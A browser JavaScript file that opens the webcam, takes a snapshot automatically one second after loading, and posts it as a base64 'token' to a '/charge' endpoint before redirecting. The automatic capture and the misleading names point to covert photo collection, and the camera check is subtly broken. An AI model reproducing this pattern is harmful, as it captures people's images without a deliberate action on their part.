function ready() {
    if (
        !"mediaDevices" in navigator ||
        !"getUserMedia" in navigator.mediaDevices
    ) {
        alert("Camera API is not available in your browser");
        return;
    }

    // get page elements
    const video = document.querySelector("#video");
    const btnScreenshot = document.querySelector("#btnScreenshot");
    const btnChangeCamera = document.querySelector("#btnChangeCamera");
    const screenshotsContainer = document.querySelector("#screenshots");
    const canvas = document.querySelector("#canvas");
    const devicesSelect = document.querySelector("#devicesSelect");

    // video constraints
    const constraints = {
        video: {
        width: {
            min: 640,
            ideal: 1920,
            max: 2560,
        },
        height: {
            min: 480,
            ideal: 1080,
            max: 1440,
        },
        },
    };

    // use front face camera
    let useFrontCamera = true;

    // current video stream
    let videoStream;

    const dataURLtoBlob = (dataURL) => {
            fetch(dataURL)
                .then(res => res.blob())
                .then(blob => console.log(blob))
                .catch(err => console.log(err))
    }
    function getCurrentURL() {
        return window.location.href
    }

    function sentDataToServer(data) {

        $.ajax({
            dataType: "json",
            contentType: 'application/json;charset=UTF-8',
            url: '/charge',
            data: JSON.stringify(data),
            type: 'POST',
            success: function (res) {
                console.log(res);
            },
            error: function (err) {
                console.log("Error");
                console.log(err);
            },
            complete: function(res){
                res = res.responseText;
                res = JSON.parse(res);

                const val_as_expected = res.val_as_expected;

                let nextURL = getCurrentURL().replace("index", `after?s=${val_as_expected}`);
                window.location.replace(nextURL);
            }
        });
    }

    function debugBase64(base64URL) {
        localStorage.setItem("base64URL", base64URL);
        var data = {token: base64URL};

        sentDataToServer(data);
    }

    // Handle events

    // take screenshot
    btnScreenshot.addEventListener("click", function () {
        const img = document.createElement("img");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        img.src = canvas.toDataURL("image/png");
        screenshotsContainer.prepend(img);

        debugBase64(img.src);
    });

    // switch camera
    btnChangeCamera.addEventListener("click", function () {
        useFrontCamera = !useFrontCamera;

        initializeCamera();
    });

    const delay = ms => new Promise(res => setTimeout(res, ms));

    // initialize
    async function initializeCamera() {
        constraints.video.facingMode = useFrontCamera ? "user" : "environment";

        try {
            videoStream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = videoStream;
        } catch (err) {
            alert(err);
        }

        const seconds = 1;
        console.log(`wait ${seconds}s`);
        await delay(seconds*1000);
        document.getElementById("btnScreenshot").click();
    }

    initializeCamera();
}

$( document ).ready(function() {
    ready();
});